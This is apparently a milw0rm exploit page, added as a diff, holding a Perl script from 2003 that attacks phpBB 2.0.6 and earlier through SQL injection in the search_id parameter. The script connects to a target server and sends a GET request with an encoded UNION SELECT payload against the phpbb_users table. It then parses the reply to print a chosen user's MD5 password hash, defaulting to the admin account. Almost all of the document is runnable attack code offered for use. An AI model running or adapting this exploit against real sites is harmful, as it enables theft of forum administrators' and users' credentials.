@@ -1,0 +1,76 @@
+<html><head><title>phpBB 2.0.6 search_id sql injection MD5 Hash Remote Exploit
+</title></head><pre>#!/usr/bin/perl -w
+use IO::Socket;
+##    PROOF-OF-CONCEPT
+##    * work only with mysql ver &gt; 4.0
+##    * work only with post #1 
+##
+##    Example:
+##    C:\&gt;r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2
+##    [~] prepare to connect...
+##    [+] connected
+##    [~] prepare to send data...
+##    [+] OK
+##    [~] wait for response...
+##    [+] MD5 Hash for user with id=2 is: 5f4dcc3b5aa765d61d8327deb882cf99
+##
+if (@ARGV &lt; 4)
+{
+print &quot;\n\n&quot;;
+print &quot;|****************************************************************|\n&quot;;
+print &quot; r57phpbb.pl\n&quot;;
+print &quot; phpBB v&lt;=2.06 search_id sql injection exploit (POC version)\n&quot;;
+print &quot; by RusH security team // www.rsteam.ru , http://rst.void.ru\n&quot;;
+print &quot; coded by f3sy1 &amp; 1dt.w0lf // 16/12/2003\n&quot;;
+print &quot; Usage: r57phpbb-poc.pl &lt;server&gt; &lt;folder&gt; &lt;user_id&gt; &lt;search_id&gt;\n&quot;;
+print &quot; e.g.: r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2\n&quot;;
+print &quot; [~] &lt;server&gt; - server ip\n&quot;;
+print &quot; [~] &lt;folder&gt; - forum folder\n&quot;;
+print &quot; [~] &lt;user_id&gt; - user id (2 default for phpBB admin)\n&quot;;
+print &quot; [~] &lt;search_id&gt; - play with this value for results\n&quot;;
+print &quot;|****************************************************************|\n&quot;;
+print &quot;\n\n&quot;;
+exit(1);
+}
+$success = 0;
+$server = $ARGV[0];
+$folder = $ARGV[1];
+$user_id = $ARGV[2];
+$search_id = $ARGV[3];
+print &quot;[~] prepare to connect...\n&quot;;
+$socket = IO::Socket::INET-&gt;new(
+Proto =&gt; &quot;tcp&quot;,
+PeerAddr =&gt; &quot;$server&quot;,
+PeerPort =&gt; &quot;80&quot;) || die &quot;$socket error $!&quot;;
+print &quot;[+] connected\n&quot;;
+print &quot;[~] prepare to send data...\n&quot;;
+# PROOF-OF-CONCEPT reguest...
+print $socket &quot;GET /$folder/search.php?search_id=$search_id%20union%20select%20concat
+(char(97,58,55,58,123,115,58,49,52,58,34,115,101,97,114,99,104,95,114,101,115,117,108,
+116,115,34,59,115,58,49,58,34,49,34,59,115,58,49,55,58,34,116,111,116,97,108,95,109,
+97,116,99,104,95,99,111,117,110,116,34,59,105,58,53,59,115,58,49,50,58,34,115,112,108,
+105,116,95,115,101,97,114,99,104,34,59,97,58,49,58,123,105,58,48,59,115,58,51,50,58,34)
+,user_password,char(34,59,125,115,58,55,58,34,115,111,114,116,95,98,121,34,59,105,58,48,
+59,115,58,56,58,34,115,111,114,116,95,100,105,114,34,59,115,58,52,58,34,68,69,83,67,34,
+59,115,58,49,50,58,34,115,104,111,119,95,114,101,115,117,108,116,115,34,59,115,58,54,
+58,34,116,111,112,105,99,115,34,59,115,58,49,50,58,34,114,101,116,117,114,110,95,99,
+104,97,114,115,34,59,105,58,50,48,48,59,125))%20from%20phpbb_users%20where%20user_id=$user_id/*
+HTTP/1.0\r\n\r\n&quot;;
+print &quot;[+] OK\n&quot;;
+print &quot;[~] wait for response...\n&quot;;
+while ($answer = &lt;$socket&gt;)
+{
+if ($answer =~ /;highlight=/)
+{
+$success = 1;
+@result=split(/;/,$answer);
+@result2=split(/=/,$result[1]);
+$result2[1]=~s/&amp;amp/ /g;
+print &quot;[+] MD5 Hash for user with id=$user_id is: $result2[1]\n&quot;;
+}
+}
+if ($success==0) {print &quot;[-] exploit failed =(\n&quot;;}
+## o---[ RusH security team | www.rsteam.ru | 2003 ]---o
+
+
+# milw0rm.com [2003-12-21]</pre></html>
